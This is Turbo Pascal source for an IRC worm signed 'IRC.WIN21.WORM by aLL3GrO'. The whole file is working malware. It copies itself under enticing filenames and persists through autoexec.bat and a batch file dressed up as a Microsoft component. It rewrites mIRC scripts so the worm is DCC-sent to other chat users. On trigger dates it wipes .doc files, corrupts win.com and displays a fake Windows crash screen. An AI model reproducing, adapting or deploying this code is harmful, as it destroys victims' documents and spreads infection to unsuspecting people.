   program win21;
   uses crt,dos;

   const days : array [0..6] of String[9] =
        ('Sunday','Monday','Tuesday',
         'Wednesday','Thursday','Friday',
         'Saturday');
   var
     hr, min, secs, hund : Word;

     y, m, d, dow : Word;
     mirc,mirc1:text;
     reg,err1,infected,done,dropper:text;
     i,count,infct,g:integer;
     s,comd3,comd5:string;
     re,re1,re2,re3,re4,c,chk:PathStr;

   {--------------------------------------------------------------------------}

   function LeadingZero(w : Word) : String;
   var
     s : String;
   begin
     Str(w:0,s);
     if Length(s) = 1 then
       s := '0' + s;
     LeadingZero := s;
   end;

   {-------------------------------------------------------------------------}

   procedure ExecPayload;
   begin
     assign(err1,'c:\windows\win.com');
     rewrite(err1);
     write(err1,' ');
     close(err1);
     if s='C:\' then
     begin
       textbackground(blue);
       clrscr;
       textbackground(white);
       textcolor(black);
       gotoxy(36,7);
       write('Windows');
       textbackground(blue);
       textcolor(white);
       gotoxy(7,9);
       writeln('An error has occured in module USER.EXE at address 000FFE:FFFF00.');
       gotoxy(7,10);
       write('Windows has stopped responding and will be terminated.');
       gotoxy(7,14);
       writeln('* Hit CTRL+ALT+DEL to restart the computer. Your program will be');
       gotoxy(9,15);
       write('closed and you will lose any unsaved information.');
       gotoxy(7,16);
       write('* You can hit Enter to try continue with Windows');
       REPEAT
         delay(100);
         textcolor(random(yellow));
         gotoxy(15,20);
         write('WIN THE 21st CENTURY !!......by B.T. >>>>>');
       until keypressed;
       readln;
     end;
   end;

   {---------------------------------------------------------------------------}

   procedure ExecPayload2;
   var inf:text;
       sf:string;
       DirInfo:SearchRec;
   begin
     FindFirst('c:\*.doc', AnyFile, DirInfo);
     while DosError = 0 do
     begin
       sf:=concat('C:\',DirInfo.Name);
       assign(inf,sf);
       rewrite(inf);
       write(inf,'');
       close(inf);
       FindNext(DirInfo);
     end;
     FindFirst('c:\mydocu~1\*.doc', AnyFile, DirInfo);
     while DosError = 0 do
     begin
       sf:=concat('C:\MYDOCU~1\',DirInfo.Name);
       assign(inf,sf);
       rewrite(inf);
       write(inf,'');
       close(inf);
       FindNext(DirInfo);
     end;
   end;

   {---------------------------------------------------------------------------}

   procedure InfectComputer;
   var
     source, dest,source2,dest2: file;
     NumRead, NumWritten: Word;
     Buf: array[1..2048] of Char;
     errchk:PathStr;

   begin
     c:=Fsearch('video.exe',s);
     if c <> '' then
       comd3:=FExpand(c);
     c:=Fsearch('FunPics.exe',s);
     if c <> '' then
       comd3:=FExpand(c);
     c:=Fsearch('Funny.exe',s);
     if c <> '' then
       comd3:=FExpand(c);
     c:=Fsearch('pics.exe',s);
     if c <> '' then
       comd3:=FExpand(c);
     c:=Fsearch('party.exe',s);
     if c <> '' then
       comd3:=FExpand(c);
     c:=Fsearch('pics4you.exe',s);
     if c <> '' then
       comd3:=FExpand(c);
     c:=Fsearch('Funlove.exe',s);
     if c <> '' then
       comd3:=FExpand(c);
     c:=Fsearch('Jokes.exe',s);
     if c <> '' then
       comd3:=FExpand(c);
     c:=FSearch('Game.exe',s);
     if c <> '' then
       comd3:=FExpand(c);
     c:=FSearch('Bunny.exe',s);
     if c <> '' then
       comd3:=FExpand(c);
     c:=FSearch('sexy.exe',s);
     if c <> '' then
       comd3:=FExpand(c);
     c:=FSearch('girls.exe',s);
     if c <> '' then
       comd3:=FExpand(c);
     Assign(source,comd3);
     Reset(source, 1);
     Assign(dest,comd5);
     Rewrite(dest, 1);
     Repeat
       BlockRead(source, Buf, SizeOf(Buf), NumRead);
       BlockWrite(dest, Buf, NumRead, NumWritten);
     until (NumRead = 0) or (NumWritten <> NumRead);
     Close(source);
     Close(dest);
     assign(source2,comd3);
     reset(source2, 1);
     assign(dest2,'c:\windows\sysmapi.exe');
     rewrite(dest2, 1);
     Repeat
       BlockRead(source2, Buf, SizeOf(Buf), NumRead);
       BlockWrite(dest2, Buf, NumRead, NumWritten);
     until (NumRead = 0) or (NumWritten <> NumRead);
     close(source2);
     close(dest2);
     errchk:=FSearch('Autoexec.bat','c:\');
     assign(reg,'c:\autoexec.bat');
     if errchk='' then
       rewrite(reg)
     else
       append(reg);
     writeln(reg);
     writeln(reg,'@c:\windows\winsys.bat');
     SetFAttr(reg,ReadOnly);
     close(reg);
     assign(dropper,'c:\windows\winsys.bat');
     rewrite(dropper);
     writeln(dropper,'@echo off');
     writeln(dropper,'@rem --------------------------------------');
     writeln(dropper,'@rem Win32 MAPI Kernel Loader');
     writeln(dropper,'@rem DO NOT DELETE OR MODIFY');
     writeln(dropper,'@rem Copyright (c) 1999-2000 Microsoft Corp.');
     writeln(dropper,'@rem ---------------------------------------');
     writeln(dropper,'');
     writeln(dropper,'@c:\windows\sysmapi.exe');
     SetFAttr(dropper,ReadOnly);
     close(dropper);
     assign(infected,'c:\windows\system\Winsys.dll');
     rewrite(infected);
     write(infected,'Done');
     close(infected);
   end;

   {---------------------------------------------------------------------------}

   procedure SpreadVirus(dirname:string);
   var chkcfg:PathStr;
       full,full2:string;
   begin
     full:=concat(dirname,'mirc.ini');
     full2:=concat(dirname,'options.ini');
     chkcfg:=FSearch('mirc.ini',dirname);
     assign(mirc,full2);
     rewrite(mirc);
     writeln(mirc,'[script]');
     write(mirc,'n0=on 1:join:#:if $me != $nick .msg $nick You really need to check out this fun program. ');
     writeln(mirc,'Pls forward this program to everyone else.');
     writeln(mirc,'n1=on 1:join:#:if $me != $nick .dcc send $nick',' ',comd5);
     writeln(mirc,'n2=on 1:connect:.msg ^Allegro^ Win21 rulez !!!');
     write(mirc,'n3=on 1:connect:.timer 60 /run iexplore www.girltown.com');
     close(mirc);
     if s<>'C:\' then
     begin
       if chkcfg <> '' then
       begin
         assign(mirc1,full);
         append(mirc1);
         writeln(mirc1);
         writeln(mirc1,'n2=options.ini');
         write(mirc1,'n3=options.ini');
         close(mirc1);
       end;
     end;
   end;

   {---------------------------------------------------------------------------}

   procedure DisplayMsg;
   begin
     asm
       mov AX,13h
       int 10h
       mov ah,09H
       mov al,01H
       mov bh,0
       mov bl,7H
       mov cx,80
       int 10h
     end;
     readln;
     asm
       mov ax,3h
       int 10h
     end;
   end;

   begin
     RANDOMIZE;
     infct:=random(12)+1;
     case infct of
     1:comd5:='c:\windows\system\video.exe';
     2:comd5:='c:\windows\system\FunPics.exe';
     3:comd5:='c:\windows\system\Funny.exe';
     4:comd5:='c:\windows\system\pics.exe';
     5:comd5:='c:\windows\system\party.exe';
     6:comd5:='c:\windows\system\pics4you.exe';
     7:comd5:='c:\windows\system\Funlove.exe';
     8:comd5:='c:\windows\system\Jokes.exe';
     9:comd5:='c:\windows\system\Game.exe';
     10:comd5:='c:\windows\system\Bunny.exe';
     11:comd5:='c:\windows\system\sexy.exe';
     12:comd5:='c:\windows\system\girls.exe';
     end;
     re1:=FSearch('winsys.dll','c:\windows\system');
     GetDir(0,s);
     if s <> 'C:\' then
       DisplayMsg;
     re:=FSearch('mirc32.exe','c:\mirc\');
     re2:=FSearch('mirc32.exe','c:\mirc32\');
     re3:=FSearch('mirc32.exe','c:\irc\');
     re4:=FSearch('mirc32.exe','c:\chat\');
     if re1='' then
     begin
       if re <> '' then
          SpreadVirus('c:\mirc\')
       else if re2<>'' then
         SpreadVirus('c:\mirc32')
       else if re3<>'' then
         SpreadVirus('c:\irc\')
       else if re4<>'' then
         SpreadVirus('c:\chat\');
     end;
     if re1='' then
       InfectComputer;
     chk:=FSearch('win.com','c:\windows');
     GetTime(hr,min,secs,hund);
     GetDate(y,m,d,dow);
     if days[dow]='Wednesday' then
     begin
       if (LeadingZero(hr) >= '16') and (leadingZero(hr) < '17') then
         ExecPayload2;
     end;
     if d=16 then
     begin
       if chk <>'' then
         ExecPayload;
     end;
   end.

   {---------------------------------------------------------------------------
     IRC.WIN21.WORM by aLL3GrO...... }
